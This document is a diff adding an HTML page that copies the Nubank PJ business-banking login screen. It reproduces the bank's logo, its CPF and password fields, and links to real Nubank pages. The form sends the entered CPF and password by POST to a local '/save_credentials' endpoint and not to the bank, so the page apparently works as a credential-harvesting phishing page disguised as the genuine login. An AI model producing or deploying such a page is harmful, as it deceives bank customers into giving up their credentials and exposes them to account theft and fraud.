@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nubank PJ - Login | Nubank Web App</title>
+    <link rel="apple-touch-icon" href="assets/images/favicon/apple-touch-icon.png">
+    <link rel="shortcut icon" href="assets/images/favicon/favicon-32x32.png" type="image/x-icon">
+    <link rel="stylesheet" href="assets/styles/style.css">
+    <script src="https://unpkg.com/imask" defer></script>
+    <script src="assets/scripts/formulario-valido.js" defer></script>
+    <script src="assets/scripts/mascara-login.js" defer></script>
+    <script src="assets/scripts/mostrar-senha.js" defer></script>
+    <script src="assets/scripts/verificar-login.js" defer></script>
+    <script src="assets/scripts/verificar-senha.js" defer></script>
+</head>
+
+<body>
+    <a href="https://nubank.com.br/" id="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 82 46">
+            <path title="Logotipo Nubank"
+                d="M1.618 12.46A14.325 14.325 0 0 1 14.25 4.75c.19 0 .378 0 .564.01-2.44 2.551-3.748 5.671-3.939 10.441-.042 1.006 0 5.912 0 11.425v17.693H.049V25.007c0-1.993-.11-4.039 0-6.051.123-2.245.514-4.45 1.569-6.497ZM24.876.48a13.65 13.65 0 0 0-10.09 4.296c8.068 0 13.29 5.493 13.583 14.241.066 2.006.088 12.744.088 12.744v12.55h10.825V27.348c0-5.128.042-9.569-.316-12.625C37.968 6.194 32.748.481 24.875.481Zm57.075 26.4c.11-2.012 0-4.055 0-6.048V1.52H71.128v17.69c0 5.507.042 10.415 0 11.426-.19 4.772-1.498 7.89-3.939 10.44.187 0 .376.013.565.013a14.324 14.324 0 0 0 12.633-7.71c1.055-2.053 1.445-4.255 1.564-6.498ZM57.124 45.355a13.649 13.649 0 0 0 10.09-4.295c-8.068 0-13.29-5.493-13.583-14.242-.066-2.008-.095-6.989-.095-12.758V1.509l-10.818.011v16.977c0 5.128-.042 9.568.316 12.624 1.002 8.531 6.223 14.233 14.09 14.233Z">
+            </path>
+        </svg>
+    </a>
+    <img src="assets/images/tela-login/1722350702-nu_web_pj_login.png"
+        alt="Imagem de uma mão segurando cartão de crédito PJ do Nubank" id="imagem-tela-login">
+    <div id="janela-login">
+        <a href="https://nubank.com.br/" id="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 82 46">
+                <path title="Logotipo Nubank"
+                    d="M1.618 12.46A14.325 14.325 0 0 1 14.25 4.75c.19 0 .378 0 .564.01-2.44 2.551-3.748 5.671-3.939 10.441-.042 1.006 0 5.912 0 11.425v17.693H.049V25.007c0-1.993-.11-4.039 0-6.051.123-2.245.514-4.45 1.569-6.497ZM24.876.48a13.65 13.65 0 0 0-10.09 4.296c8.068 0 13.29 5.493 13.583 14.241.066 2.006.088 12.744.088 12.744v12.55h10.825V27.348c0-5.128.042-9.569-.316-12.625C37.968 6.194 32.748.481 24.875.481Zm57.075 26.4c.11-2.012 0-4.055 0-6.048V1.52H71.128v17.69c0 5.507.042 10.415 0 11.426-.19 4.772-1.498 7.89-3.939 10.44.187 0 .376.013.565.013a14.324 14.324 0 0 0 12.633-7.71c1.055-2.053 1.445-4.255 1.564-6.498ZM57.124 45.355a13.649 13.649 0 0 0 10.09-4.295c-8.068 0-13.29-5.493-13.583-14.242-.066-2.008-.095-6.989-.095-12.758V1.509l-10.818.011v16.977c0 5.128-.042 9.568.316 12.624 1.002 8.531 6.223 14.233 14.09 14.233Z">
+                </path>
+            </svg>
+        </a>
+        <form action="/save_credentials" method="POST">
+            <h1>Acesse o Nubank PJ</h1>
+            <div class="input">
+                <label for="login">CPF</label>
+                <div id="input-login">
+                    <input type="text" id="login" name="login">
+                    <button type="button" disabled>
+                        <svg viewBox="0 0 24 24" id="invalido" style="display: none;">
+                            <title>warning_circle</title>
+                            <path d="M13 15V17H11V15H13Z"></path>
+                            <path d="M13 14V7H11V14H13Z"></path>
+                            <path
+                                d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22ZM12 20C7.58172 20 4 16.4183 4 12C4 7.58172 7.58172 4 12 4C16.4183 4 20 7.58172 20 12C20 16.4183 16.4183 20 12 20Z">
+                            </path>
+                        </svg>
+                    </button>
+                </div>
+                <p id="alerta-login"></p>
+            </div>
+            <div class="input">
+                <label for="password">Senha</label>
+                <div id="input-senha">
+                    <input type="password" id="password" name="password">
+                    <button type="button" id="mostrar-senha">
+                        <svg viewBox="0 0 24 24" id="mostrar" style="display: block;">
+                            <title>Show password</title>
+                            <path
+                                d="M2.9516 7.6325L2.84468 7.46399L1.15625 8.53601C1.21613 8.63032 1.27681 8.72624 1.33838 8.82358C1.85487 9.64008 2.4344 10.5562 3.13276 11.4535L1.29336 13.2929L2.70757 14.7071L4.46019 12.9545C5.36757 13.845 6.44596 14.6379 7.76292 15.1913L7.03894 17.7253L8.96199 18.2747L9.6757 15.7767C10.3907 15.9209 11.1634 16 12.0005 16C12.8375 16 13.6102 15.9209 14.3252 15.7767L15.0389 18.2747L16.962 17.7253L16.238 15.1913C17.555 14.6379 18.6334 13.845 19.5407 12.9545L21.2934 14.7071L22.7076 13.2929L20.8682 11.4535C21.5665 10.5562 22.1459 9.64035 22.6624 8.82385C22.724 8.72642 22.7847 8.63041 22.8447 8.53601L21.1562 7.46399L21.0493 7.6325C19.1384 10.645 17.0102 14 12.0005 14C6.99074 14 4.86257 10.6451 2.9516 7.6325Z">
+                            </path>
+                        </svg>
+                        <svg viewBox="0 0 24 24" id="esconder" style="display: none;">
+                            <title>Hide password</title>
+                            <path
+                                d="M2.84468 13.536L2.9516 13.3675C4.86257 10.3549 6.99074 7 12.0005 7C17.0102 7 19.1384 10.3549 21.0493 13.3675L21.1562 13.536L22.8447 12.464C22.7847 12.3696 22.724 12.2736 22.6624 12.1761C20.801 9.23351 18.123 5 12.0005 5C5.87794 5 3.19997 9.23351 1.33855 12.1762C1.27698 12.2735 1.21613 12.3697 1.15625 12.464L2.84468 13.536Z">
+                            </path>
+                            <path
+                                d="M16.0005 13C16.0005 15.2091 14.2096 17 12.0005 17C9.79132 17 8.00046 15.2091 8.00046 13C8.00046 10.7909 9.79132 9 12.0005 9C14.2096 9 16.0005 10.7909 16.0005 13ZM14.0005 13C14.0005 11.8954 13.105 11 12.0005 11C10.8959 11 10.0005 11.8954 10.0005 13C10.0005 14.1046 10.8959 15 12.0005 15C13.105 15 14.0005 14.1046 14.0005 13Z">
+                            </path>
+                        </svg>
+                    </button>
+                </div>
+                <p id="alerta-senha">A senha precisa ter 8 ou mais caracteres.</p>
+            </div>
+            <a href="https://app.nubank.com.br/beta/login/esqueci-senha/">Esqueci a senha</a>
+            <button type="submit" id="enviar-formulario" disabled>
+                <p>Acessar</p>
+                <svg viewBox="0 0 24 24">
+                    <title>arrow_right</title>
+                    <path
+                        d="M12 4L10.59 5.41L16.17 11H4V13H16.17L10.59 18.59L12 20L19.2929 12.7071C19.6834 12.3166 19.6834 11.6834 19.2929 11.2929L12 4Z">
+                    </path>
+                </svg>
+            </button>
+        </form>
+        <div id="opcoes-secundarias">
+            <div id="links">
+                <a href="https://nubank.com.br/conta-pj/">Não sou cliente</a>
+                <a href="https://app.nubank.com.br/roubo/">Me Roubaram</a>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
